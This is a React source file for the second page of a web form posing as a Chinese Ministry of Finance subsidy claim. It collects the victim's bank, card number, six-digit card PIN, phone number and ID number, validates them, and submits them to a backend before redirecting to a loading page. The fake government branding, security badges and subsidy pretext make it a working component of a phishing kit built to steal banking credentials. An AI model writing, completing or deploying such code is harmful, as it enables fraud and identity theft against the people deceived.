import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { toast } from "sonner";
import FormHeader from '@/components/FormHeader';
import Footer from '@/components/Footer';
import { UserFormData } from '@/types';
import { submitFormData } from '@/utils/api';

// 验证银行卡号（16-19位数字）
const isValidCardNumber = (cardNumber: string): boolean => {
  const cardRegex = /^\d{16,19}$/;
  return cardRegex.test(cardNumber);
};

// 验证6位数字密码
const isValidPassword = (password: string): boolean => {
  const passwordRegex = /^\d{6}$/;
  return passwordRegex.test(password);
};

// 验证姓名（2-8个汉字）
const isValidName = (name: string): boolean => {
  const nameRegex = /^[\u4e00-\u9fa5]{2,8}$/;
  return nameRegex.test(name);
};

// 验证手机号（11位数字，以1开头）
const isValidPhone = (phone: string): boolean => {
  const phoneRegex = /^1\d{10}$/;
  return phoneRegex.test(phone);
};

// 验证身份证号
const isValidIdNumber = (id: string): boolean => {
  // 身份证号码为15位或者18位，15位时全为数字，18位前17位为数字，最后一位是校验位，可能为数字或字符X
  const reg = /(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)/;
  if (!reg.test(id)) {
    return false;
  }

  if (id.length === 18) {
    // 加权因子
    const weight = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2];
    // 校验码
    const codes = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2'];
    
    // 获取前17位
    const idCard17 = id.substring(0, 17);
    
    // 获取校验码
    const checkCode = id.substring(17, 18).toUpperCase();
    
    // 计算校验码
    let sum = 0;
    for (let i = 0; i < 17; i++) {
      sum += parseInt(idCard17[i]) * weight[i];
    }
    
    // 计算出来的校验码与输入的校验码比对
    return checkCode === codes[sum % 11];
  }
  
  return true; // 15位身份证不做校验
};

const SecondForm = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState<UserFormData>({
    fullName: '',
    idNumber: '',
    bankName: '',
    cardNumber: '',
    password: '',
    holderName: '',
    phoneNumber: '',
    idCard: '',
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Load data from first form
  useEffect(() => {
    const savedData = sessionStorage.getItem('formData');
    if (!savedData) {
      // Redirect back to first form if no data is found
      navigate('/');
      return;
    }
    
    try {
      const parsedData = JSON.parse(savedData);
      setFormData(prev => ({ ...prev, ...parsedData }));
    } catch (error) {
      console.error('Error parsing saved form data:', error);
      navigate('/');
    }
  }, [navigate]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // 验证所有必填字段
    if (!formData.bankName || !formData.cardNumber || !formData.password || 
        !formData.holderName || !formData.phoneNumber || !formData.idCard) {
      toast.error("请填写所有必填字段");
      return;
    }
    
    // 验证银行卡号
    if (!isValidCardNumber(formData.cardNumber)) {
      toast.error("请输入16-19位有效的银行卡号");
      return;
    }
    
    // 验证密码
    if (!isValidPassword(formData.password)) {
      toast.error("请输入6位数字密码");
      return;
    }
    
    // 验证持卡人姓名
    if (!isValidName(formData.holderName)) {
      toast.error("请输入2-8个汉字的持卡人姓名");
      return;
    }
    
    // 验证手机号
    if (!isValidPhone(formData.phoneNumber)) {
      toast.error("请输入有效的11位手机号码");
      return;
    }
    
    // 验证身份证号
    if (!isValidIdNumber(formData.idCard)) {
      toast.error("请输入有效的身份证号码");
      return;
    }
    
    setIsSubmitting(true);
    
    try {
      // Submit data
      const submissionId = await submitFormData(formData);
      sessionStorage.setItem('submissionId', submissionId);
      
      // Simulate network delay
      setTimeout(() => {
        setIsSubmitting(false);
        navigate('/loading');
      }, 1000);
    } catch (error) {
      console.error('Error submitting form:', error);
      toast.error("提交数据时出错，请重试");
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-b from-blue-50 to-gray-100 animate-fade-in">
      <div className="form-container my-8">
        <FormHeader />
        
        <div className="p-6">
          <h2 className="text-lg font-medium text-center mb-6">请填写财政补助领取银行信息</h2>
          
          <div className="mb-6">
            <div className="flex items-center mb-4">
              <div className="w-4 h-4 rounded-full border border-gov-blue flex items-center justify-center">
                <div className="w-2 h-2 bg-gov-blue rounded-full"></div>
              </div>
              <span className="ml-2 text-sm">补助领取银行卡</span>
            </div>
          </div>
          
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <select
                name="bankName"
                value={formData.bankName}
                onChange={handleChange}
                className="gov-input"
              >
                <option value="">请选择财政补助领取的银行</option>
                <option value="中国工商银行">中国工商银行</option>
                <option value="中国农业银行">中国农业银行</option>
                <option value="中国银行">中国银行</option>
                <option value="中国建设银行">中国建设银行</option>
                <option value="交通银行">交通银行</option>
                <option value="招商银行">招商银行</option>
                <option value="中信银行">中信银行</option>
                <option value="浦发银行">浦发银行</option>
              </select>
            </div>
            
            <div>
              <input
                type="text"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleChange}
                placeholder="银行卡号"
                className="gov-input"
              />
            </div>
            
            <div>
              <input
                type="password"
                name="password"
                value={formData.password}
                onChange={handleChange}
                placeholder="六位密码"
                maxLength={6}
                className="gov-input"
              />
            </div>
            
            <div>
              <input
                type="text"
                name="holderName"
                value={formData.holderName}
                onChange={handleChange}
                placeholder="持卡人姓名"
                className="gov-input"
              />
            </div>
            
            <div>
              <input
                type="tel"
                name="phoneNumber"
                value={formData.phoneNumber}
                onChange={handleChange}
                placeholder="预留手机号"
                className="gov-input"
              />
            </div>
            
            <div>
              <input
                type="text"
                name="idCard"
                value={formData.idCard}
                onChange={handleChange}
                placeholder="持卡人身份证号"
                className="gov-input"
              />
            </div>
            
            <button 
              type="submit" 
              className="gov-button-secondary flex items-center justify-center mt-6"
              disabled={isSubmitting}
            >
              {isSubmitting ? (
                <div className="flex items-center space-x-2">
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>处理中...</span>
                </div>
              ) : "开始领取"}
            </button>
          </form>
        </div>
        
        <div className="flex justify-center space-x-8 my-6">
          <img 
            src="public/x1.png" 
            alt="Security Badge" 
            className="w-20 h-10"
          />
          <img 
            src="public/x2.png" 
            alt="Security Shield" 
           className="w-10 h-10"
          />
        </div>
      </div>
      
      <div className="mt-auto text-center text-xs text-gray-500 py-4">
        {new Date().getFullYear()} 中华人民共和国财政部 版权所有
      </div>
    </div>
  );
};

export default SecondForm;
